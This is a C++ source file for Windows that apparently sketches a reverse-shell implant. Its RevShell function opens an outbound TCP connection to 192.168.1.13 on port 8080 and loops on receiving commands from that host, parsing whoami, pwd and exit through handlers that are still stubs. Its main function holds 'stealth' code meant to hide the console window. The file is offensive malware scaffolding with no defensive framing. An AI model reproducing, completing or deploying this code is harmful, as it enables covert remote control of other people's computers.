// c++ headers

#include <winsock2.h>   // Socket header
#include <windows.h>    // Win API header
#include <ws2tcpip.h>   // TCP-IP Header

// C Header
#include <stdio.h> //Input Output header

// Debug C++ Header
#include <iostream> //Input Output Debug Header

#pragma comment(lib,"Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

void RevShell(){
    WSADATA wsaver; //contains details like the version info, system status
    WSAStartup(MAKEWORD(2,2), &wsaver);

    SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("192.168.1.13");
    addr.sin_port = htons(8080);
 
    if(connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr))==SOCKET_ERROR) {
        closesocket(tcpsock);
        WSACleanup();
        exit(0);
    }
    else {
        std::cout << "[+] Connected to client. waiting for incoming command..." << std::endl;

        char commandReceived[DEFAULT_BUFLEN] ="";
        while (true)
        {
            int result = recv(tcpsock, commandReceived, DEFAULT_BUFLEN, 0);
            std::cout << "Command received : " << commandReceived;
            std::cout << "Length of the command received : " << result << std::endl;
            // parse command
            if(strcmp(commandReceived, "whoami\n") == 0){
                   std::cout << "Command parsed: whoami" << std::endl;
                //Execute a whoami() function
            }
            else if ((strcmp(commandReceived, "pwd\n") == 0)) {
                std::cout << "Command parsed: pwd" << std::endl;
                //Execute a pwd() function
            }
            else if ((strcmp(commandReceived, "exit\n") == 0)) {
                std::cout << "Command parsed: exit";
                std::cout << "Closing connection" << std::endl;
                //Exit gracefully
            }
            else {
                std::cout << "Command not parsed!" << std::endl;
            }

            memset(commandReceived, 0, sizeof(commandReceived)); // clean buffer (we do not use string.h to not increase the size of the binary)
            
        }
        
    }
    closesocket(tcpsock);
    WSACleanup();
    exit(0);

}


int main(){
     HWND stealth;           //Declare a window handle 
    AllocConsole();     //Allocate a new console
    stealth=FindWindowA("ConsoleWindowClass",NULL); //Find the previous Window handler and hide/show the window depending upon the next command
    ShowWindow(stealth,SW_SHOWNORMAL);  //SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console
    RevShell();
    return 0;
}

